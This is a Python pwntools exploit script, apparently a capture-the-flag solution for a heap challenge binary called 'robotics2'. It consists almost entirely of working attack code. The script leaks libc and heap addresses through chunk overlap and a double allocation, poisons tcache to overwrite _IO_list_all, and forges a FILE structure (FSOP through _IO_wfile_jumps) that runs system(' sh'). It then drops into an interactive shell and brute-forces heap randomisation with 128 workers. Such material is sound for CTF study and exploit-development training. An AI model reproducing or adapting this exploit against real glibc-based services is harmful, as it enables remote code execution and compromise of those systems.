#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'robotics2')
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def start(argv=[], *a, **kw):
    if args.LOCAL:
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)
    return connect(host, port)

gdbscript = '''
tbr setup
c
call (void)brk(0x555555670000)
continue
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

from pwnbrute import *

MENU = b'status\n> '

def num(n):
    return str(n).encode()

def create_robot(desc=cyclic(0x2e), tp=3):
    io.sendlineafter(MENU, b'1')
    io.sendlineafter(b'>> ', num(tp))
    io.sendlineafter(b': ', desc)

def put_into_prod(idxs):
    for idx in idxs:
        io.sendlineafter(MENU, b'3')
        io.sendlineafter(b': ', num(idx))

libc = ELF('libc.so.6')

def pwn():
    global io
    io = start()

    # ======= Part 1: libc leak ========
    # overlap 2 chunks, change size to 0x420, free
    # to unsortedbin and leak libc pointer

    # == heap feng shui ==
    create_robot()  # padding
    rid = 2

    for _ in range(7):  # fill tcache in thread2
        create_robot()

    for _ in range(8):  # to overlap 2 chunks
        create_robot(p8(0))  # !!! p8(0) cuz before stashing to tcache libc checks align of
                             # next chunk, so (0x6161616361616162 ^ 0x555555670) not aligned

    for _ in range(10):  # to fix fastbins (also padding for 0x420)
        create_robot()

    put_into_prod(range(rid, rid + 15))
    rid += 7 + 8 + 10

    io.sendlineafter(MENU, b'2')
    io.sendlineafter(b': ', b'10')
    sleep(2.1)
    io.sendlineafter(b': ', b'8')  # adjust fd of chunk to alloc in some other chunk

    create_robot()  # stash to tcache
    create_robot(flat({0x28 + 4: p16(0x461)}))
    rid += 2

    for _ in range(2):
        create_robot()
    rid += 2

    create_robot(cyclic(0x2e))
    put_into_prod([rid])  # free 0x460 chunk to unsortedbin
    rid += 1
    sleep(2.1)

    # == fix fastbins ==
    for _ in range(3):  # clear tcache
        create_robot(cyclic(0x2e))
    rid += 3

    for i in [23, 24, 17, 18]:  # choose chunks, which after fd adjust will chained like in 2free
        put_into_prod([i])
        sleep(.2)

    io.sendlineafter(MENU, b'2')
    io.sendlineafter(b': ', b'24')
    sleep(2.1)
    io.sendlineafter(b': ', b'48')

    for _ in range(4):  # stash in tcache and clear tcache
        create_robot()
    rid += 4

    create_robot()  # shrink unsortedbin so libc pointers will be placed on allocated chunk
    rid += 1

    io.sendlineafter(MENU, b'4')
    io.recvuntil(b'(#30)')
    io.recvuntil(b'VoltRise (#')
    leak_libc_low = int(io.recvuntil(b')', True))
    io.recvuntil(b'Desc: ')
    leak_libc_high = u16(io.recvn(2))
    libc.address = LIBC_BASE = ((leak_libc_high << 32) + leak_libc_low) - 0x203b20
    print(hex(LIBC_BASE))
    assert (LIBC_BASE >> 40) == 0x7f

    DBL_ALLOCATED_CHUNK = rid
    for _ in range(13):  # clear unsortedbin
        create_robot()
    rid += 13


    # ======= Part 2: heap leak ========
    FSOP_STRUCTS = rid
    for _ in range(10):  # save for file struct
        create_robot()
    rid += 10

    for _ in range(8):
        create_robot()
    create_robot(flat({4 + 0x10: p8(1)}))  # align check bypass
    create_robot()

    put_into_prod([DBL_ALLOCATED_CHUNK])  # note: chunk present in `robots` twice, so
                                          # robot `resource` will be decresed 2x faster
    sleep(2.1)

    io.sendlineafter(MENU, b'4')
    io.recvuntil(b'(#40)')
    io.recvuntil(b'Res: ')
    leak = int(io.recvuntil(b' (in prod)', True).decode().replace('.', ''))
    HEAP_BASE = (((leak & ~0xff) + 0x70) << 12) + (5 << 44)
    print(hex(HEAP_BASE))
    assert (HEAP_BASE >> 40) == 0x55 and (HEAP_BASE & 0xffffff) in (0x670000, 0x270000)
    success()

    # ======= Part 3: alloc on _IO_list_all ========
    # == override _IO_list_all ==
    for i in [69, 68,] + [71, 70, 67] + [72,] + [66, 65]:
        put_into_prod([i])
        sleep(.2)

    io.sendlineafter(MENU, b'2')
    io.sendlineafter(b': ', b'68')

    sleep(2.1)
    io.sendlineafter(b': ', b'32')

    rid += 10
    create_robot()  # stash to tcache
    create_robot(flat({  # override next ptr
        0x20 + 4: ((HEAP_BASE + 0x1000) >> 12) ^ (libc.sym['_IO_list_all'] - 0x10)
    }))

    for _ in range(5):
        create_robot()
    create_robot(flat({4: HEAP_BASE + 0xc10}))  # override _IO_list_all

    # == build file struct ==
    for i in range(FSOP_STRUCTS, FSOP_STRUCTS + 8):
        put_into_prod([i])
        sleep(.2)

    sleep(2.1)

    WD_BASE = HEAP_BASE + 0xd10
    create_robot()
    create_robot(flat({0x24: [b' sh\0']}))                # _flags
    create_robot()
    create_robot(flat({4: {
        0x2: p8(0),                                       # _vtable_offset
        0x8: HEAP_BASE,                                   # _lock
        0x20: WD_BASE,                                    # _wide_data
    }}))
    create_robot(flat({
        4 + 0x8: libc.sym['_IO_wfile_jumps'] + 0x30       # vtable
    }))
    create_robot(flat({4 + 0x8: libc.sym['system']}))     # [_wide_data->_wide_vtable + 0x18]
    create_robot()
    create_robot(flat({0x24: WD_BASE + 0x10}))            # _wide_vtable

    io.sendlineafter(MENU, b'2')
    io.sendlineafter(b': ', b'13371337')

    io.interactive()


if __name__ == '__main__':
    brute(pwn, workers=128, timeout=60)  # brute 12-bits in heap addr
